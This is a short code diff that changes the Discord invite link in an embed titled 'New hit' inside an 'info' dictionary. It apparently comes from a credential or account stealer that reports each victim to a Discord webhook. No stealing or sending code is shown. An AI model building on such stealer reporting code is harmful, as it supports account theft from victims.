@@ -84,7 +84,7 @@ info = {
   "content": '',
   "embeds": [
     {
-      "title": "New hit | https://discord.gg/beamers",
+      "title": "New hit | https://discord.gg/comped",
       "color": 1341395,
       "fields": [
         {
